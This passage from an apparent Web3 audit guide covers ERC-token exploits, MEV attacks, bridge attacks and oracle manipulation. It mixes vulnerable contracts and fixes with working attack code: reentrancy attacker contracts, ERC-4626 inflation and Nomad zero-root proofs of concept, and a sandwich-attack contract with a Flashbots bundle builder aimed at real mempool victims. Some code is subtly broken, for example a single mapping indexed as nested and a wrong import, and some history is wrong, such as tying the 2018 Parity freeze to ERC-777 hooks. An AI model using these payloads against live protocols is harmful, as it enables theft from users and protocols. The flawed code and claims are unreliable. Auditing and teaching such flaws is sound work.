cast call 0xTarget "totalAssets()" --rpc-url $RPC
cast storage 0xTarget 0 --rpc-url $RPC  # slot 0
cast 4byte 0x70a08231                   # decode selector

# ─── Decompile unverified contract ───
heimdall decompile --target 0xTarget --rpc-url $RPC

# ─── Decompile via web ───
# https://app.dedaub.com/decompile
# https://ethervm.io/decompile/mainnet/0xTarget

# ─── Reentrancy PoC skeleton ───
forge test --match-test test_PoC_DrainViaReentrancy \
  --fork-url http://localhost:8545 -vvvv 2>&1 | tee poc.log

# ─── Flash loan PoC skeleton ───
forge test --match-test test_PoC_FlashLoanOracle \
  --fork-url http://localhost:8545 -vvvv

# ─── Bridge audit quick checklist ───
# 1. signature hash includes BOTH chain IDs
# 2. signature replay protection (nonce + processed mapping)
# 3. validator set update has timelock
# 4. root hash initialization != zero (Nomad lesson)
# 5. pausable by multisig
```

---

## 16. ERC-Specific Exploit Payloads

Each ERC standard introduces new hooks, transfer semantics, and accounting quirks. The vast majority of post-2022 Web3 incidents trace to a protocol assuming ERC-20 semantics for a token that is actually ERC-777, ERC-1155, or a fee-on-transfer ERC-20 variant.

### 16.1 ERC-20 `approve` / `transferFrom` Front-Running (SWC-114)

The ERC-20 `approve` race: an owner sets `allowance = 100`, then later submits `approve(spender, 50)` to reduce it. A malicious spender sees the pending tx, front-runs with `transferFrom(100)` to consume the existing allowance, and the new `approve(50)` lands on top — netting the spender 150 instead of 50.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Vulnerable: raw approve without 0-reset intermediate step.
contract NaiveVault {
    mapping(address => uint256) public allowance;
    mapping(address => uint256) public balanceOf;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;  // direct overwrite — race window
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        return true;
    }
}
```

**Fix pattern (OpenZeppelin `SafeERC20.forceApprove` / `increaseAllowance` + `decreaseAllowance`)**:

```solidity
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Correct two-step approve-then-set:
IERC20(token).safeApprove(spender, 0);                 // reset first
IERC20(token).safeApprove(spender, newAmount);         // then set new
// Or: increaseAllowance / decreaseAllowance for delta updates
```

### 16.2 Infinite Allowance Sweeper

A "sweeper" contract that holds `type(uint256).max` allowance against every user deposit is a honeypot — one storage-collision or privileged-mint bug becomes a protocol-wide drain.

```solidity
// Vulnerable: protocol-wide infinite allowance to a single helper.
contract SweepHelper {
    IERC20 public immutable token;
    address public immutable vault;

    constructor(IERC20 _token, address _vault) {
        token = _token;
        vault = _vault;
    }

    function sweep(address[] calldata victims) external {
        // Anyone can call sweep? Or only owner? Either way, this helper
        // has infinite allowance on every depositor's wallet.
        for (uint256 i = 0; i < victims.length; i++) {
            token.transferFrom(victims[i], vault, token.balanceOf(victims[i]));
        }
    }
}
```

**Slither detector**: `slither . --detect erc20-interruptible` and `--detect unchecked-transfer`.

### 16.3 Fee-on-Transfer / Deflationary Token Accounting Bug

Many DeFi "compatible with any ERC-20" vaults assume `transferFrom(100)` credits the receiver 100. Fee-on-transfer tokens (e.g., PAXG, older deflationary tokens) actually credit 99.5. The vault over-credits the depositor by the fee, slowly draining the protocol.

```solidity
// Vulnerable: credits `amount` without measuring what actually arrived.
contract BuggyVault {
    IERC20 public immutable token;
    mapping(address => uint256) public shares;

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);  // may only deliver amount - fee
        shares[msg.sender] += amount;                           // BUG: should measure actual receipt
    }
}
```

**Fix (balance-delta pattern)**:

```solidity
function deposit(uint256 amount) external nonReentrant {
    uint256 balBefore = token.balanceOf(address(this));
    SafeERC20.safeTransferFrom(token, msg.sender, address(this), amount);
    uint256 balAfter  = token.balanceOf(address(this));
    uint256 received  = balAfter - balBefore;            // trust what actually arrived
    shares[msg.sender] += received;
    emit Deposit(msg.sender, received);
}
```

**Foundry PoC (fork mainnet PAXG)**:

```solidity
// test/PaxgVaultPoC.t.sol
function testPoC_FeeOnTransferDrain() public {
    // PAXG: 0x45804880De22913dAFE09f4980848ECE6EcbAf78 on mainnet, ~20 bps fee
    address PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    IERC20 token = IERC20(PAXG);

    // Whale impersonation on anvil fork
    vm.createSelectFork("mainnet", 19_000_000);
    address whale = 0xREPLACE_WITH_YOUR_PAXG_WHALE;
    vm.startPrank(whale);
    token.transfer(alice, 1000 ether);
    vm.stopPrank();

    uint256 feeBps = 20; // 0.2%
    // Demonstrate the vault under-collateralization after N deposits
    // ...
}
```

### 16.4 ERC-721 — `safeTransferFrom` Callback Reentrancy

`safeTransferFrom` triggers `onERC721Received` on the receiver. Any state the contract reads inside that hook is mid-transfer and stale.

```solidity
// Vulnerable: mint-by-index after a safeTransferFrom callback.
contract BuggyNFTMarket {
    mapping(uint256 => address) public ownerOf;
    uint256 public nextId;
    uint256 public price = 1 ether;

    function buy() external payable {
        require(msg.value == price, "wrong price");
        uint256 id = nextId++;
        // BUG: safeMint invokes onERC721Received BEFORE ownerOf[id] = msg.sender
        _safeMint(msg.sender, id);
        ownerOf[id] = msg.sender;
    }

    function _safeMint(address to, uint256 id) internal {
        (bool ok, ) = to.call(abi.encodeWithSignature("onERC721Received(address,address,uint256,bytes)",
            address(0), to, id, ""));
        require(ok, "reject");
    }
}

// Attacker re-enters buy() inside onERC721Received — `nextId` already incremented,
// but `price` is still keyed off the original state. Mint N tokens for the price of 1.
contract NFTReentrancyAttacker {
    BuggyNFTMarket public market;
    uint256 public counter;

    constructor(address _m) { market = BuggyNFTMarket(payable(_m)); }

    function pwn() external payable {
        market.buy{value: 1 ether}();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (counter++ < 10 && address(this).balance >= 1 ether) {
            market.buy{value: 1 ether}();
        }
        return this.onERC721Received.selector;
    }
}
```

### 16.5 ERC-721 Enumerable — Owner-Set Disclosure

`ERC721Enumerable` exposes `tokenOfOwnerByIndex(address, uint256)`, which lets anyone enumerate every token an address owns — including NFTs in a private vault contract. Pair this with on-chain `tokenURI(uint256)` calls to leak the contents of "private" collections.

```javascript
// ethers.js — dump every NFT owned by a vault
import { ethers } from "ethers";

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const erc721Enum = new ethers.Contract(
  "0xREPLACE_WITH_YOUR_NFT_CONTRACT",
  [
    "function balanceOf(address owner) view returns (uint256)",
    "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
    "function tokenURI(uint256 tokenId) view returns (string)",
  ],
  provider,
);

async function dump(vault) {
  const n = await erc721Enum.balanceOf(vault);
  for (let i = 0n; i < n; i++) {
    const id = await erc721Enum.tokenOfOwnerByIndex(vault, i);
    const uri = await erc721Enum.tokenURI(id);
    console.log(vault, id.toString(), uri);
  }
}
```

### 16.6 ERC-1155 — Batch Transfer Abuse + `uri()` Injection

`safeBatchTransferFrom` lets a single call move dozens of token IDs at once. A naive protocol that wraps each transfer in `nonReentrant` separately, or that consumes its own balance check inside the loop, can be exploited via batch ordering.

```solidity
// Vulnerable: per-iteration balance check against own storage during a callback.
contract Buggy1155Gateway {
    IERC1155 public immutable token;
    mapping(uint256 => uint256) public heldBalance;

    function batchDeposit(uint256[] calldata ids, uint256[] calldata amounts, bytes calldata data) external {
        for (uint256 i = 0; i < ids.length; i++) {
            heldBalance[ids[i]] += amounts[i];
            // safeTransferFrom triggers onERC1155Received — attacker can call
            // batchWithdraw in the callback before the loop finishes.
            token.safeTransferFrom(msg.sender, address(this), ids[i], amounts[i], data);
        }
    }
}
```

ERC-1155's `uri(uint256)` returns a templated string (`https://example.com/{id}.json`). A buggy client that substitutes the wrong value (e.g., attacker-controlled query param) can be tricked into rendering attacker metadata.

```solidity
function uri(uint256 id) external view returns (string memory) {
    // BUG: unvalidated substitution — if id is keccak(attacker-controlled-string)
    // the URI may render as https://attacker/...
    return string(abi.encodePacked("https://api.protocol/", Strings.toHexString(id), ".json"));
}
```

### 16.7 ERC-777 `tokensReceived` Reentrancy — The Parity-class Bug

ERC-777 adds a `tokensReceived` hook on the recipient. Any protocol that treats an ERC-777 token as "just an ERC-20" is at risk: the hook fires synchronously inside `transfer`, opening a reentrancy window even when CEI appears to be followed.

```solidity
// Vulnerable: treats ERC-777 as ERC-20, no reentrancy guard.
contract LiquidityPool {
    IERC20 public immutable token;     // actually ERC-777 under the hood
    mapping(address => uint256) public deposits;

    constructor(address _t) { token = IERC20(_t); }

    function deposit(uint256 amount) external {
        // State written FIRST — looks like CEI is followed.
        deposits[msg.sender] += amount;
        // BUG: ERC-777 transfer triggers tokensReceived on the SENDER (this) and receiver.
        // Inside the hook, msg.sender is the original caller; they can call withdraw()
        // against a state where deposits[] is already credited but transfer not yet finalized.
        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount);
        deposits[msg.sender] -= amount;
        token.transfer(msg.sender, amount);  // re-entry here too
    }
}

// Attacker registers as ERC-777 recipient, re-enters withdraw inside tokensReceived.
contract ERC777Attacker {
    LiquidityPool public pool;
    IERC20 public immutable token;

    constructor(address _p, address _t) { pool = LiquidityPool(_p); token = IERC20(_t); }

    function pwn() external {
        // send ourselves tokens, triggering the hook mid-deposit
        pool.deposit(0);  // trigger entry into pool with non-zero external call
    }

    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        // Reenter withdraw while pool's deposit loop has not yet returned.
        if (token.balanceOf(address(this)) > 0) {
            pool.withdraw(0);  // recursive drain
        }
    }
}
```

> **Reference**: the July 2018 Parity multisig hack ($150M frozen) and the Lendf.Me drain (April 2020, $25M) both rode ERC-777 hooks. See `skills/blockchain-web3/guides/blockchain-web3-defi-reentrancy-deep.md` for the deep dive and audit methodology.

### 16.8 ERC-4626 Inflation Attack (First-Depositor / Dead Shares)

ERC-4626 vaults price shares as `shares = assets * totalShares / totalAssets`. The first depositor can donate a huge amount of `asset` directly to the vault via plain `transfer`, making `totalAssets >> 0` while `totalShares == 1`. Every subsequent depositor overpays for shares, donating the excess to the first "shareholder."

```solidity
// Vulnerable: vanilla ERC-4626 with no dead-share defense.
contract BuggyVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) {}

    // First-depositor attack:
    // 1. Attacker deposits 1 wei → receives 1 share (totalShares = 1).
    // 2. Attacker transfers 1_000_000e18 asset directly to the vault (bypassing deposit()).
    // 3. totalAssets = 1_000_000e18 + 1; totalShares = 1.
    // 4. Victim deposits 500_000e18 → shares = 500_000e18 * 1 / 1_000_000e18 = 0 (rounds to 0!)
    //    → victim loses 500_000e18 asset, attacker withdraws 1_500_000e18.
}
```

**Foundry PoC**:

```solidity
// test/ERC4626InflationPoC.t.sol
function testPoC_FirstDepositorInflation() public {
    TestToken asset = new TestToken();
    BuggyVault vault = new BuggyVault(asset);

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    asset.mint(attacker, 1);
    asset.mint(attacker, 1_000_000 ether);
    asset.mint(victim,   500_000 ether);

    vm.startPrank(attacker);
    asset.approve(address(vault), 1);
    vault.deposit(1, attacker);                       // mint 1 share
    asset.transfer(address(vault), 1_000_000 ether);  // direct donation
    vm.stopPrank();

    vm.startPrank(victim);
    asset.approve(address(vault), 500_000 ether);
    uint256 shares = vault.deposit(500_000 ether, victim);
    assertEq(shares, 0, "victim got 0 shares for 500k assets");  // inflation bug confirmed

    // Attacker now owns 100% of the vault — victim's 500k asset is captured.
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);
    assertGt(asset.balanceOf(attacker), 1_400_000 ether);
}
```

**Fix patterns**:

```solidity
// 1. Mint dead shares on construction (OpenZeppelin pattern).
constructor(IERC20 asset) ERC4626(asset) {
    _mint(address(0), 1_000);  // dead shares dilute the attacker
}

// 2. Virtual assets + virtual shares (OZ >= 5.x, EIP-4626 mux).
//    override _convertToShares to add a virtual offset:
function _convertToShares(uint256 assets, Math.Rounding) internal view override returns (uint256) {
    return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
}
//    with _decimalsOffset() = 3 → mint 1_000 dead shares on first deposit.

// 3. Mismatched-deposit defense: measure balance-delta in deposit().
function deposit(uint256 assets, address receiver) public override returns (uint256) {
    uint256 before = asset.balanceOf(address(this));
    super._deposit(_msgSender(), receiver, assets);
    require(asset.balanceOf(address(this)) >= before + assets, "donation detected");
    // ...
}
```

> **Slither detector**: `slither . --detect erc4626` flags uninitialized vaults and missing `nonReentrant`.

### 16.9 Per-ERC Audit Quick Matrix

| Token std | Hook fired | When | Reentrancy vector |
|-----------|-----------|------|-------------------|
| ERC-20 | none | n/a | Only via external calls in business logic |
| ERC-721 | `onERC721Received` | `safeTransferFrom` / `safeMint` | Mint-at-index, callback before ownerOf set |
| ERC-1155 | `onERC1155Received` / `onERC1155BatchReceived` | `safeTransferFrom` / `safeBatchTransferFrom` | Batch-order mid-loop, single-id reentry |
| ERC-777 | `tokensReceived` (sender + receiver) | any `send` / `transfer` | Full transfer-time hook — treat like ETH send |
| ERC-4626 | (none standardized) | n/a | Inflation, donation, rounding griefing |

---

## 17. MEV (Maximal Extractable Value) Payloads

### 17.1 Sandwich Attack Contracts (Flashbots-Style)

A sandwich bundle is three transactions ordered atomically by a block builder: front-run buy → victim buy → back-run sell. Profit comes from the price impact the victim's swap creates.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
}

contract SandwichAttacker {
    address public immutable owner;
    IERC20 public immutable WETH;
    IERC20 public immutable USDC;
    IUniswapV2Pair public immutable pair;

    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }
    constructor(address _weth, address _usdc, address _pair) {
        owner = msg.sender;
        WETH = IERC20(_weth); USDC = IERC20(_usdc); pair = IUniswapV2Pair(_pair);
    }

    /// @notice Front-run step: push price up by buying target token.
    function frontRun(uint256 wethIn) external onlyOwner {
        WETH.transfer(address(pair), wethIn);
        // Compute min output from reserves, then swap (USDC out)
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amountOut = getAmountOut(wethIn, r0, r1);
        pair.swap(0, amountOut, address(this), "");
    }

    /// @notice Back-run step: dump target token — restore price, realize profit.
    function backRun(uint256 usdcIn) external onlyOwner {
        USDC.transfer(address(pair), usdcIn);
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amountOut = getAmountOut(usdcIn, r1, r0);
        pair.swap(amountOut, 0, address(this), "");
    }

    function getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut)
        internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}
```

**Bundle builder (TypeScript + ethers.js + Flashbots)**:

```typescript
import { ethers } from "ethers";
import { FlashbotsBundleProvider, FlashbotsTransactionResolution } from "@flashbots/relay";

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const authSigner = new ethers.Wallet(process.env.SEARCHER_PK!);  // 0xac0974... style test key OK

const relay = await FlashbotsBundleProvider.create(provider, authSigner);

// Build three signed txs (front-run, then victim insert, then back-run).
// Victim tx is observed from the mempool, not signed by us — we just include its raw bytes.
const frontRunTx = await attacker.frontRun.populateTransaction(parseEther("100"));
const backRunTx  = await attacker.backRun.populateTransaction(parseEther("250"));

const signedBundle = await relay.signBundle([
  { signer: searcher, transaction: frontRunTx },
  { signedTransaction: victimRawTxHex },                 // already signed by victim
  { signer: searcher, transaction: backRunTx },
]);

const targetBlock = await provider.getBlockNumber() + 1;
const sim = await relay.simulate(signedBundle, targetBlock);
console.log("sim profit (wei):", sim.coinbaseDiff.toString());

const resp = await relay.sendRawBundle(signedBundle, targetBlock);
if (resp === FlashbotsTransactionResolution.BundleIncluded) {
  console.log("bundle landed in block", targetBlock);
}
```

### 17.2 Back-Running Arbitrage Bot

Back-running sits in the same block as a trigger tx (e.g., a large DEX swap) but *after* it, capturing any resulting arb gap. Lower-risk than sandwich (no victim harm, no slippage trapping).

```python
# arb_backrun.py — listen for DEX swaps, submit arb back-run bundle
import asyncio, json, os
from web3 import Web3
from flashbots import Flashbot

w3 = Web3(Web3.WebsocketProvider(os.environ["RPC_WS"]))
signer = Web3.eth.account.from_key(os.environ["SEARCHER_PK"])  # test-only key OK

flashbot(w3, signer)

DEX_ROUTER = Web3.to_checksum_address("0xREPLACE_WITH_YOUR_ROUTER")
PAIR       = Web3.to_checksum_address("0xREPLACE_WITH_YOUR_PAIR")
ARB_BOT    = w3.eth.contract(address=BOT_ADDR, abi=BOT_ABI)

async def on_pending(tx_hash):
    tx = w3.eth.get_transaction(tx_hash)
    if tx["to"] != DEX_ROUTER:
        return
    # Decode calldata; if it is a swap that moves our target pair, build an arb
    if not _is_large_swap(tx): return
    arb_tx = ARB_BOT.functions.executeArb(PAIR).build_transaction({
        "from": signer.address,
        "nonce": w3.eth.get_transaction_count(signer.address, "pending"),
        "gas": 250_000,
        "maxFeePerGas": w3.eth.gas_price * 2,
        "maxPriorityFeePerGas": 0,                # back-run: low tip
        "chainId": w3.eth.chain_id,
    })
    signed = signer.sign_transaction(arb_tx)
    block  = w3.eth.block_number
    bundle = [{"signer": signer, "transaction": arb_tx}]
    sim    = w3.flashbots.simulate(bundle, target_block_number=block + 1)
    if sim.coinbase_diff > 0:
        w3.flashbots.send_bundle(bundle, target_block_number=block + 1)

async def main():
    sub = w3.eth.subscribe("newPendingTransactions")
    async for msg in sub:
        asyncio.create_task(on_pending(msg["result"]))
asyncio.run(main())
```

### 17.3 JIT (Just-In-Time) Liquidity Sniping

JIT LPs mint Uniswap V3 concentrated liquidity one tick before a large swap, capture the fee, then burn the position one tick after — earning fee revenue without taking price risk.

```solidity
// JIT LP contract skeleton — conceptual; mainnet UX depends on mempool + position math.
interface IUniswapV3Pool {
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount,
        bytes calldata data) external returns (uint256 amount0, uint256 amount1);
    function burn(int24 tickLower, int24 tickUpper, uint128 amount)
        external returns (uint256 amount0, uint256 amount1);
    function collect(address recipient, int24 tickLower, int24 tickUpper,
        uint128 amount0Requested, uint128 amount1Requested)
        external returns (uint256 amount0, uint256 amount1);
}

contract JITLP {
    IUniswapV3Pool public immutable pool;

    constructor(address _p) { pool = IUniswapV3Pool(_p); }

    function execute(uint128 amount0Desired, uint128 amount1Desired,
        int24 lo, int24 hi, bytes calldata flashData) external {
        // 1. Flash-loan token0 + token1 to fund mint.
        // 2. Mint at (lo, hi) — concentrated around current tick to capture target swap.
        // 3. Wait for swap to land inside the pool's callback logic.
        // 4. Burn position, repay flash loan, keep fee.
        pool.mint(address(this), lo, hi, amount0Desired, flashData);
        // uniswapV3MintCallback fires → fund the mint with borrowed tokens
    }

    function uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata) external {
        // Transfer borrowed amounts to the pool here.
        // After swap lands, burn + collect + repay.
    }
}
```

### 17.4 Cross-Domain MEV

Cross-domain MEV exploits value extractable across multiple chains — e.g., a token on Ethereum mainnet and its canonical bridge representation on Arbitrum. A price gap between the two can be captured atomically if the bridge supports a fast finality layer (e.g., LayerZero's DVN set, or CCIP).

```typescript
// Cross-domain arb skeleton (LayerZero-style)
import { ethers } from "ethers";

const eth   = new ethers.JsonRpcProvider(process.env.MAINNET_RPC);
const arb   = new ethers.JsonRpcProvider(process.env.ARBITRUM_RPC);

async function priceGap(): Promise<bigint> {
    const mainPrice = await priceFeedMain.latestRoundData();
    const arbPrice  = await priceFeedArb.latestRoundData();
    return BigInt(mainPrice.answer) - BigInt(arbPrice.answer);
}

async function fireArb(amount: bigint) {
    // Trigger bridge swap on the cheaper side, receive on the expensive side, sell locally.
    if (gap > 0) {
        await arbRouter.swapETHForExactTokens(amount, { value: amount });
        // receive bridged tokens on mainnet, sell into AMM for profit
    } else {
        await mainRouter.swapETHForExactTokens(amount, { value: amount });
    }
}
```

### 17.5 MEV Tools — Trending

| Tool | Repo | Purpose |
|------|------|---------|
| **mev-inspect-py** | `flashbots/mev-inspect-py` | Historical MEV classification — sandwich, arb, liquidation |
| **mev-share** | `flashbots/mev-share` | Event stream of opportunities to back-run |
| **helm** | `0xMacroFi/helm` | Local MEV simulator (forked mainnet + bundle ordering) |
| **flashbots-protect** | `flashbots/protect-rpc` | Private mempool — protects users from being sandwiched |
| **libmev** | `flashbots/libmev` | Go SDK for bundle construction |

```bash
# Run mev-inspect against a historical block range
git clone https://github.com/flashbots/mev-inspect-py
cd mev-inspect-py && poetry install
poetry run mev inspect 19000000 19000100  # block range

# Flashbots Protect RPC for users (no sandwich on your txs)
cast send --rpc-url https://rpc.flashbots.net/fast --private-key $PK 0xTarget "deposit()"

# Subscribe to MEV-Share streams for back-run opportunities
# https://docs.flashbots.net/flashbots-mev-share/introduction
```

---

## 18. Cross-Chain Bridge Attack Payloads

Bridges concentrate the largest historical losses in Web3 (Ronin $625M, Wormhole $326M, Nomad $190M, BNB Bridge $570M). Bridge security reduces to **three primitives**: validator signature sets, message-passing Merkle roots, and lock-and-mint collateral accounting.

### 18.1 Lock-and-Mint Exploitation (Wormhole-Style)

Wormhole's Feb 2022 incident ($326M) traced to a Solana program that wrapped a fake `core_bridge` instruction set, signed by an attacker-spoofed guardian set on the Solana side. The chain assumed guardian signatures were valid without verifying the guardian set on-chain.

```solidity
// Vulnerable: guardian set is trusted off-chain; on-chain check uses stale set.
contract VulnerableWormholeGateway {
    address[] public guardians;          // 19 guardians
    mapping(bytes32 => bool) public consumed;

    function verifyVMMessage(
        bytes memory vmMessage,
        uint8[] calldata sigVs,
        bytes32[] calldata sigRs,
        bytes32[] calldata sigSs
    ) external returns (bytes memory) {
        bytes32 hash = keccak256(vmMessage);
        // BUG: signature threshold uses the CURRENT guardians array, but
        // an attacker may have submitted a stale signed message that
        // passed the previous (lower-threshold) set.
        require(sigVs.length >= 13, "below threshold");   // 13 of 19

        for (uint256 i = 0; i < sigVs.length; i++) {
            // Recovers signer from each sig but never checks they are CURRENT guardians.
            address signer = ecrecover(hash, sigVs[i] + 27, sigRs[i], sigSs[i]);
            // BUG: missing require(_isGuardian(signer))
        }

        require(!consumed[hash], "replay");
        consumed[hash] = true;
        return vmMessage;
    }
}
```

**Audit checklist**:

- Guardian set must be referenced by version (not by array slot)
- Quorum threshold must be enforced per-version
- All `ecrecover` results must be checked against the *current* guardian set
- Guardian set rotation must have a timelock + log event

### 18.2 Liquidity Pool Draining (Nomad-Style)

Nomad's Aug 2022 incident ($190M) traced to a routine `initialize` upgrade that set the committed Merkle root to `0x00`. The proof verifier's branch logic accepted any message with an empty proof against a zero root, letting anyone copy-paste a "send me tokens" message.

```solidity
// Vulnerable: zero-root acceptance — the core Nomad-class bug.
contract VulnerableRootManager {
    bytes32 public committedRoot;     // accidentally initialized to bytes32(0)

    function process(bytes32[] calldata proof, bytes calldata message) external {
        bytes32 leaf = keccak256(message);
        // BUG: MerkleProof.verify returns true for proof=[] when root == bytes32(0)
        //      because the "leaf" itself equals the root.
        require(MerkleProof.verify(proof, committedRoot, leaf), "bad proof");

        // Token release based on message contents — attacker just copies a valid message.
        (address to, uint256 amount) = abi.decode(message, (address, uint256));
        IERC20(token).transfer(to, amount);
    }
}
```

**Foundry PoC pattern**:

```solidity
function testPoC_NomadZeroRoot() public {
    VulnerableRootManager rm = new VulnerableRootManager();
    // attacker deploys with committedRoot = bytes32(0) (simulating misinitialization)

    bytes memory message = abi.encode(attacker, 1_000_000 ether);
    bytes32[] memory emptyProof = new bytes32[](0);   // empty proof
    rm.process(emptyProof, message);                  // passes against zero root!

    assertEq(token.balanceOf(attacker), 1_000_000 ether);
}
```

### 18.3 Validator Signature Forgery (Ronin-Style)

Ronin's March 2022 incident ($625M) traced to a compromised validator infrastructure: the attacker gained signing keys for 5 of 9 validators (above the 5-of-9 withdrawal threshold) via social engineering of a node operator. The on-chain code was correct; the key management was not.

```solidity
// Vulnerable threshold signing — read-only "security".
contract RoninBridge {
    address[] public validators;                  // 9 signers
    uint256 public threshold = 5;                  // 5-of-9
    mapping(bytes32 => bool) public processed;

    function release(bytes calldata payload, bytes[] calldata sigs) external {
        bytes32 h = keccak256(payload);
        require(!processed[h], "replay");

        uint256 validSigs = 0;
        for (uint256 i = 0; i < sigs.length; i++) {
            address signer = ECDSA.recover(h, sigs[i]);
            if (_isValidator(signer)) validSigs++;
        }
        require(validSigs >= threshold, "below threshold");

        processed[h] = true;
        (address to, uint256 amount) = abi.decode(payload, (address, uint256));
        IERC20(token).transfer(to, amount);
    }
}

// Attacker compromise path: key theft off-chain → not detectable in code review.
// Defense: hardware-backed signers (HSM), distributed key gen (DKG), and
// regular rotation + on-chain pause via a 2-of-N guardian multisig.
```

**Key management audit points**:

- Validators MUST use HSMs (YubiHSM, AWS CloudHSM, Ledger Enterprise)
- Validator set rotation must be a 2-step commit-reveal with timelock
- A "guardian" multi-sig (independent from validator set) must be able to pause the bridge
- On-chain signatures must be checked for uniqueness (no duplicate signers in the array)

### 18.4 Wrapped Asset Double-Spend

Tokens minted on chain B (canonical bridge representation) must be burned when the asset is bridged back to chain A. A naive bridge that uses two different message-passing layers (one in each direction) can be tricked into minting on B without burning on A.

```solidity
// Vulnerable: two independent message layers with no shared replay bookkeeping.
contract BuggyWrappedToken {
    mapping(address => uint256) public balanceOf;
    mapping(bytes32 => bool) public bridgedIn;
    mapping(bytes32 => bool) public bridgedOut;     // independent from bridgedIn

    function bridgeIn(bytes32 msgId, address to, uint256 amount, bytes[] calldata sigs) external {
        require(!bridgedIn[msgId], "in-replay");
        require(_verifyInboundSigs(msgId, to, amount, sigs), "bad sigs");
        bridgedIn[msgId] = true;
        balanceOf[to] += amount;                     // mint wrapped
    }

    function bridgeOut(bytes32 msgId, address from, uint256 amount) external {
        require(!bridgedOut[msgId], "out-replay");
        bridgedOut[msgId] = true;
        balanceOf[from] -= amount;                   // burn wrapped
        // ... emit message to chain A
    }
}

// Attacker: bridgeIn with a fresh msgId; never call bridgeOut. Now minted wrapped tokens
// exist on B forever, but no canonical asset was locked on A. Classic mint-without-burn.
```

### 18.5 Cross-Chain Bridge — Reference Incident Library

| Incident | Date | Loss | Root cause | Lesson |
|----------|------|------|-----------|--------|
| Ronin Bridge | Mar 2022 | $625M | 5/9 validator keys compromised via social engineering | Validator key mgmt is the bridge |
| Wormhole | Feb 2022 | $326M | Solana guardian sig spoof via fake instruction | Verify guardian set on every call |
| Nomad Bridge | Aug 2022 | $190M | Committed root initialized to `bytes32(0)` | Reject zero roots; require initialization |
| Harmony Horizon | Jun 2022 | $100M | 2-of-5 validator multisig compromise | Threshold must be ≥3-of-N (no single-bridge party failure) |
| BNB Bridge | Oct 2022 | $570M | IAVL proof verification bug (added extra bytes) | Verify proof bounds + canonical encoding |
| Multichain | Jul 2023 | $230M | Operator key compromise (custodial bridge) | Non-custodial design (no single operator key) |

> **Sources**: Rekt.news leaderboard, Chainalysis 2023/2024 Crypto Crime Reports, Elliptic 2024 Bridge Report.

---

## 19. Oracle Manipulation Payloads

### 19.1 Chainlink Price Feed Staleness Abuse

Chainlink aggregators stop updating if the source deviation is below a threshold or if the upstream deviates from a heartbeat. A protocol that reads `.latestAnswer()` without checking `updatedAt` accepts stale prices as if current.

```solidity
// Vulnerable: no staleness check.
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract VulnerablePriceOracle {
    AggregatorV3Interface public immutable feed;   // e.g., ETH/USD

    constructor(address _feed) { feed = AggregatorV3Interface(_feed); }

    function getAssetPrice() external view returns (uint256) {
        (, int256 answer, , uint256 updatedAt, ) = feed.latestRoundData();
        // BUG: no check that updatedAt is recent — during L2 sequencer outage,
        // the feed may be stale by hours but still return an "answer".
        return uint256(answer);
    }
}
```

**Fix**:

```solidity
function getAssetPrice() external view returns (uint256) {
    (, int256 answer, , uint256 updatedAt, ) = feed.latestRoundData();
    require(block.timestamp - updatedAt < 3600, "stale price");   // 1h heartbeat
    require(answer > 0, "non-positive price");
    return uint256(answer);
}
```

**L2 sequencer outage check (Chainlink Arbitrum/Optimism pattern)**:

```solidity
AggregatorV3Interface public immutable sequencerUptimeFeed;  // 0xFdB631F5EE196F0ed6FAa767305Bde6Ead5E7bed (Arb)

function _checkSequencerUp() internal view {
    (, int256 answer, , uint256 updatedAt, ) = sequencerUptimeFeed.latestRoundData();
    require(answer == 0, "sequencer down");
    require(block.timestamp - updatedAt < 3600, "sequencer staleness");
}
```

### 19.2 Low-Liquidity TWAP Manipulation (Compound-Style)

Compound's USDD compound-style oracle used Uniswap V2 reserves directly (not TWAP). The C.R.E.A.M. and BonqDAO incidents both manipulated low-liquidity pairs to inflate collateral prices.

```solidity
// Vulnerable: spot price from a low-liquidity Uniswap V2 pair.
contract BuggyOracle {
    IUniswapV2Pair public immutable pair;     // 50k TVL pair

    function getPrice() external view returns (uint256) {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        return (uint256(r1) * 1e18) / uint256(r0);   // direct spot, no TWAP
    }
}

// Attacker: borrow 1000 ETH via Aave, dump into the pair, price spikes 100x,
// deposit collateral at inflated price, borrow against it, repay flash loan.
```

**TWAP defense (Uniswap V3 oracle)**:

```solidity
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

contract TwapOracle {
